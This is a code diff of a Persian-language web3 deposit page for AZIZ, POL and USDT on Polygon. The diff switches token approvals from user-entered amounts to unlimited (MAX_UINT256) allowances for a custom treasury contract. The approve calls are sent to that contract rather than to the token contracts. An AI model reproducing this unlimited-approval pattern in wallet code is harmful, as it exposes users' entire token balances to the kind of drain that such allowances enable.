@@ -180,6 +180,14 @@
             background: #d97706;
         }
 
+        .btn-approve-usdt {
+            background: #10b981;
+        }
+
+        .btn-approve-usdt:hover:not(:disabled) {
+            background: #059669;
+        }
+
         .status {
             margin-top: 16px;
             padding: 12px;
@@ -218,6 +226,16 @@
             color: #64748b;
             margin-top: 8px;
             text-align: center;
+        }
+
+        .approved-badge {
+            display: inline-block;
+            background: #22c55e;
+            color: white;
+            font-size: 10px;
+            padding: 2px 8px;
+            border-radius: 20px;
+            margin-right: 8px;
         }
     </style>
 </head>
@@ -273,16 +291,15 @@
                 <input type="text" id="azizTokenAddress" placeholder="مثلاً 0x44a9f9a3882a1aa8789a4512ab9455fe08174f98" value="0x44a9f9a3882a1aa8789a4512ab9455fe08174f98">
             </div>
 
-            <button id="approveBtn" class="btn-approve">✅ Approve توکن AZIZ به قرارداد</button>
+            <button id="approveUSDTBtn" class="btn-approve-usdt">✅ Approve USDT (حداکثر مقدار)</button>
+            <button id="approveBtn" class="btn-approve">✅ Approve AZIZ (حداکثر مقدار)</button>
             <button id="depositBtn">🚀 واریز به خزانه</button>
 
             <div id="status"></div>
             <div class="info-box">
-                ⚠️ گزینه اول: AZIZ (توکن اول) + POL (توکن دوم)<br>
-                ⚠️ گزینه دوم: USDT (توکن اول) + AZIZ (توکن دوم)
-            </div>
-            <div class="note">
-                ℹ️ ابتدا دکمه Approve AZIZ را بزنید، سپس واریز را انجام دهید
+                ⚠️ ابتدا دکمه‌های Approve را بزنید (یک بار کافی است)<br>
+                گزینه اول: AZIZ (توکن اول) + POL (توکن دوم)<br>
+                گزینه دوم: USDT (توکن اول) + AZIZ (توکن دوم)
             </div>
         </div>
     </div>
@@ -296,6 +313,9 @@
         const CONTRACT_ADDRESS = "0xa9bD51648a5EbaF4dBa5d7b37360Ae1a8dF6E40f";
         const USDT_ADDRESS = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";
         const NATIVE_POL = "0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE";
+        
+        // حداکثر مقدار مجاز برای Approve (unlimited)
+        const MAX_UINT256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
         const ROUTER_ABI = [
             { "inputs": [], "name": "treasury", "outputs": [{ "type": "address" }], "stateMutability": "view", "type": "function" },
@@ -320,7 +340,7 @@
         document.getElementById("wallet-btn").appendChild(document.createElement("w3m-button"));
 
         let currentAccount = null;
-        let selectedOption = "pol"; // 'pol' or 'usdt'
+        let selectedOption = "pol";
 
         window.selectOption = (opt) => {
             selectedOption = opt;
@@ -329,7 +349,6 @@
             document.getElementById(`option${opt === 'pol' ? 'POL' : 'USDT'}`).classList.add("selected");
         };
 
-        // آپدیت badge آدرس AZIZ
         const azizInput = document.getElementById("azizTokenAddress");
         const updateAzizBadges = () => {
             const addr = azizInput.value.trim();
@@ -343,7 +362,7 @@
         watchAccount(wagmiConfig, {
             onChange(account) {
                 currentAccount = account?.address || null;
-                const btns = ["approveBtn", "depositBtn"];
+                const btns = ["approveUSDTBtn", "approveBtn", "depositBtn"];
                 btns.forEach(id => {
                     const btn = document.getElementById(id);
                     if (btn) btn.disabled = !currentAccount;
@@ -354,10 +373,38 @@
         function showStatus(msg, type) {
             const div = document.getElementById("status");
             div.innerHTML = `<div class="status ${type}">${msg}</div>`;
-            setTimeout(() => { if (div.innerHTML === `<div class="status ${type}">${msg}</div>`) div.innerHTML = ""; }, 5000);
+            setTimeout(() => { 
+                if (div.innerHTML === `<div class="status ${type}">${msg}</div>`) 
+                    div.innerHTML = ""; 
+            }, 8000);
         }
 
-        // Approve AZIZ
+        // Approve USDT با حداکثر مقدار
+        document.getElementById("approveUSDTBtn").addEventListener("click", async () => {
+            if (!currentAccount) { showStatus("❌ کیف پول متصل نیست", "error"); return; }
+
+            try {
+                showStatus("🔄 Approve نامحدود USDT به قرارداد...", "loading");
+                
+                const { request } = await simulateContract(wagmiConfig, {
+                    address: CONTRACT_ADDRESS,
+                    abi: ROUTER_ABI,
+                    functionName: "approveUSDT",
+                    args: [MAX_UINT256],
+                    account: currentAccount,
+                    chainId: polygon.id
+                });
+
+                const hash = await writeContract(wagmiConfig, request);
+                showStatus(`✅ Approve نامحدود USDT انجام شد! ${hash.slice(0,10)}...`, "success");
+                
+            } catch(e) {
+                console.error(e);
+                showStatus("❌ خطا در Approve USDT: " + e.message.slice(0,100), "error");
+            }
+        });
+
+        // Approve AZIZ با حداکثر مقدار
         document.getElementById("approveBtn").addEventListener("click", async () => {
             if (!currentAccount) { showStatus("❌ کیف پول متصل نیست", "error"); return; }
 
@@ -367,50 +414,28 @@
                 return;
             }
 
-            let amountAZIZ;
-            if (selectedOption === "pol") {
-                amountAZIZ = document.getElementById("amountAZIZ").value;
-            } else {
-                amountAZIZ = document.getElementById("amountAZIZ2").value;
-            }
-
-            if (!amountAZIZ || parseFloat(amountAZIZ) <= 0) {
-                showStatus("❌ مقدار AZIZ را وارد کنید", "error");
-                return;
-            }
-
             try {
-                showStatus("🔄 دریافت decimals AZIZ...", "loading");
-                let decimals = 18;
-                try {
-                    decimals = await readContract(wagmiConfig, {
-                        address: azizAddress,
-                        abi: ERC20_ABI,
-                        functionName: "decimals",
-                        chainId: polygon.id
-                    });
-                } catch(e) {}
-
-                const amountWei = parseUnits(amountAZIZ, decimals);
-                showStatus("🔄 Approve AZIZ به قرارداد...", "loading");
+                showStatus("🔄 Approve نامحدود AZIZ به قرارداد...", "loading");
                 
                 const { request } = await simulateContract(wagmiConfig, {
                     address: CONTRACT_ADDRESS,
                     abi: ROUTER_ABI,
                     functionName: "approveToken",
-                    args: [azizAddress, amountWei],
+                    args: [azizAddress, MAX_UINT256],
                     account: currentAccount,
                     chainId: polygon.id
                 });
 
                 const hash = await writeContract(wagmiConfig, request);
-                showStatus(`✅ Approve AZIZ انجام شد! ${hash.slice(0,10)}...`, "success");
+                showStatus(`✅ Approve نامحدود AZIZ انجام شد! ${hash.slice(0,10)}...`, "success");
+                
             } catch(e) {
-                showStatus("❌ خطا: " + e.message.slice(0,100), "error");
+                console.error(e);
+                showStatus("❌ خطا در Approve AZIZ: " + e.message.slice(0,100), "error");
             }
         });
 
-        // Deposit
+        // واریز
         document.getElementById("depositBtn").addEventListener("click", async () => {
             if (!currentAccount) { showStatus("❌ کیف پول متصل نیست", "error"); return; }
 
@@ -434,20 +459,20 @@
                 } catch(e) {}
 
                 if (selectedOption === "pol") {
-                    // ✅ حالت صحیح: AZIZ (tokenA) + POL (tokenB)
+                    // حالت صحیح: AZIZ (tokenA) + POL (tokenB)
                     const amountPOL = document.getElementById("amountPOL").value;
                     const amountAZIZ = document.getElementById("amountAZIZ").value;
                     
                     if (!amountPOL || parseFloat(amountPOL) <= 0) { showStatus("❌ مقدار POL را وارد کنید", "error"); return; }
                     if (!amountAZIZ || parseFloat(amountAZIZ) <= 0) { showStatus("❌ مقدار AZIZ را وارد کنید", "error"); return; }
                     
-                    tokenA = azizAddress;                      // AZIZ به عنوان توکن اول
+                    tokenA = azizAddress;
                     amountA = parseUnits(amountAZIZ, decimalsAZIZ);
-                    tokenB = NATIVE_POL;                       // POL به عنوان توکن دوم
+                    tokenB = NATIVE_POL;
                     amountB = parseUnits(amountPOL, 18);
-                    value = parseUnits(amountPOL, 18);         // مقدار POL همراه تراکنش
+                    value = parseUnits(amountPOL, 18);
                     
-                    showStatus("🔄 واریز AZIZ + POL...", "loading");
+                    showStatus(`🔄 در حال واریز ${amountAZIZ} AZIZ + ${amountPOL} POL...`, "loading");
                     
                     const { request } = await simulateContract(wagmiConfig, {
                         address: CONTRACT_ADDRESS,
@@ -463,20 +488,20 @@
                     showStatus(`✅ واریز AZIZ + POL موفق! ${hash.slice(0,10)}...`, "success");
                     
                 } else {
-                    // ✅ حالت صحیح: USDT (tokenA) + AZIZ (tokenB)
+                    // حالت صحیح: USDT (tokenA) + AZIZ (tokenB)
                     const amountUSDT = document.getElementById("amountUSDT").value;
                     const amountAZIZ = document.getElementById("amountAZIZ2").value;
                     
                     if (!amountUSDT || parseFloat(amountUSDT) <= 0) { showStatus("❌ مقدار USDT را وارد کنید", "error"); return; }
                     if (!amountAZIZ || parseFloat(amountAZIZ) <= 0) { showStatus("❌ مقدار AZIZ را وارد کنید", "error"); return; }
                     
-                    tokenA = USDT_ADDRESS;                     // USDT به عنوان توکن اول
+                    tokenA = USDT_ADDRESS;
                     amountA = parseUnits(amountUSDT, 6);
-                    tokenB = azizAddress;                      // AZIZ به عنوان توکن دوم
+                    tokenB = azizAddress;
                     amountB = parseUnits(amountAZIZ, decimalsAZIZ);
-                    value = 0n;                                 // هیچ POL ای همراه نیست
+                    value = 0n;
                     
-                    showStatus("🔄 واریز USDT + AZIZ...", "loading");
+                    showStatus(`🔄 در حال واریز ${amountUSDT} USDT + ${amountAZIZ} AZIZ...`, "loading");
                     
                     const { request } = await simulateContract(wagmiConfig, {
                         address: CONTRACT_ADDRESS,
@@ -493,8 +518,9 @@
                 }
             } catch(e) {
                 let msg = e.message.slice(0,150);
-                if (msg.includes("execution reverted")) msg = "تراکنش برگشت خورد. ابتدا دکمه Approve AZIZ را بزنید.";
-                if (msg.includes("TokenA cannot be native")) msg = "خطای داخلی - لطفاً دوباره تلاش کنید";
+                if (msg.includes("execution reverted")) msg = "تراکنش برگشت خورد. ابتدا دکمه‌های Approve را بزنید.";
+                if (msg.includes("insufficient")) msg = "موجودی حساب شما کافی نیست.";
+                if (msg.includes("user rejected")) msg = "تراکنش توسط شما رد شد.";
                 showStatus("❌ " + msg, "error");
             }
         });
